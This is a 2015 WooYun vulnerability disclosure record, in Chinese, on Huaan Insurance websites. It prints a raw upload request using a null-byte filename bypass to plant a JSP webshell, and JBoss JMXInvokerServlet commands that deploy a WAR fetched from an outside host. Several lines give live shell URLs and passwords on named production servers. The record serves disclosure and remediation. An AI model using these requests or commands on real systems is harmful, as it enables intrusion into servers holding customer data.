{"id": 15489, "wybug_id": "wooyun-2015-0117211", "wybug_title": "华安保险主站上传绕过验证上传shell及另几个分站的问题打包", "wybug_corp": "华安保险", "wybug_author": "茜茜公主", "wybug_date": "2015-05-31 08:50", "wybug_open_date": "2015-07-19 15:32", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-19：\t细节向公众公开  简要描述： 主站任意文件上传及另几个站修复不当导致命令执行的问题 详细说明：  1#主站http://www.sinosafe.com.cn WooYun: 华安保险官网某处可任意上传html文件到根目录 针对该漏洞提出只能上传html等系统限制的后缀进行了绕过http://www.sinosafe.com.cn/upload/uppics.htm上传后抓包\n\n\nPOST http://www.sinosafe.com.cn/upload/pics.jsp HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.sinosafe.com.cn/upload/uppics.htmAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df373d2a089cUA-CPU: AMD64Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 412Host: www.sinosafe.com.cnPragma: no-cache-----------------------------7df373d2a089cContent-Disposition: form-data; name=\"cunfanweizhi\"/car-----------------------------7df373d2a089cContent-Disposition: form-data; name=\"FileName\"; filename=\"wooyun.jsp%00;.jpg\"Content-Type: image/pjpegtest-----------------------------7df373d2a089cContent-Disposition: form-data; name=\"Submit\" ϴ -----------------------------7df373d2a089c--\n记得将上面filename=\"wooyun.jsp%00;.jpg\"的%00进行URL-decode\n\n\n\n上传后的一句话地址：http://www.sinosafe.com.cn/car/wooyun.jsp密码：woo0yun\n\n服务器已成马场追溯到08年上传的马儿（目测当时eweb编辑器弱口令）http://www.sinosafe.com.cn/editor/uploadfile/1.jsp   漏洞证明：  \n\n另外该服务器上还部署了\n华安保险承保理赔信息系统https://www.sinosafe.com.cn:9080/haclaim/华安保险电子保单系统https://www.sinosafe.com.cn:18080/elec/信用卡客户保险激活系统http://www.sinosafe.com.cn:16080/internet/zhzx/activation.jsp华安保险2015校园招聘http://www.sinosafe.com.cn:8899/jobsys/2015xiaoyuanzhaopin/default.htm\n针对这几个系统曾经有白帽子在2012年提出jboss弱口令利用jmx-console拿shell的方法 WooYun: 华安保险JBoss弱口令及远程代码执行 之后又有白帽子提出过head绕过认证拿shell的方法 WooYun: 华安保险JBoss JMX-console HTTP认证绕过，远程写shell漏洞 但仍然未能彻底修复head绕过的问题，仍可通过jmx-console绕过验证拿shell\n\n一句话：https://www.sinosafe.com.cn:9080/wooyun/wooyun.jsp密码woo0yun\n\n小马：https://www.sinosafe.com.cn:18080/wooyun/ixm.jsphttp://www.sinosafe.com.cn:16080/internet/zhzx/activation.jsp该站删除了jmx-console，但是，jboss还有一种getshell方式\njava -jar jboss_exploit_fat.jar -i http://www.sinosafe.com.cn:16080/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy http://p2j.cn/is.war\n\n\nshell地址：http://www.sinosafe.com.cn:16080/is/index.jsp密码：023\n\n\njava -jar jboss_exploit_fat.jar -i http://www.sinosafe.com.cn:8899/invoker/JMXInvokerServlet invoke jboss.system:service=MainDeployer deploy http://p2j.cn/is.war\nshell地址：http://www.sinosafe.com.cn:8899/is/index.jsp密码：023\n\n现已凑齐jboss拿shell2种方法，集齐七种可在wooyun兑换神秘礼物。   修复方案：  主站上传点进行权限控制；jboss不知道如果配置，最简单的方法就是删jmx-console、删invoker/JMXInvokerServlet   版权声明：转载请注明来源 茜茜公主@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-06-04 15:30 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向保险行业信息化主管部门通报,由其后续协调网站管理单位处置.  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}